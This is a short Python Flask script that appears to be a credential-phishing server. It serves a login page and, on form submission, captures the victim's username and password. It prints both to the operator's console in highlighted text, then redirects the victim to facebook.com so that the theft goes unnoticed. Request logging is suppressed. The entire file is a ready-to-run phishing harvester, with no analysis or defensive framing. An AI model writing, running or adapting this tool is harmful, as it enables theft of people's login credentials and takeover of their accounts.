from flask import Flask, render_template, request, redirect
from colorama import init, Fore, Back, Style
import logging

init(autoreset=True)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
app = Flask(__name__)
port = 80


@app.route('/')
def index():
    print('a')
    return render_template('index.html')

@app.route('/login', methods=["POST"])
def form():
    
    data = {
        'username': request.form.get('name'),
        'password': request.form.get('password')
    }

    print('----------------')
    print(Style.BRIGHT + Fore.GREEN + 'Username: {}'.format(data['username']))
    print(Style.BRIGHT + Fore.GREEN + 'Password: {}'.format(data['password']))
    print('----------------')

    return redirect("http://www.facebook.com", code=302)

if __name__ == '__main__':
    print(Style.BRIGHT + Fore.BLUE + '[ * ] Open http://localhost/ to view page')

    app.run(port=port)
    
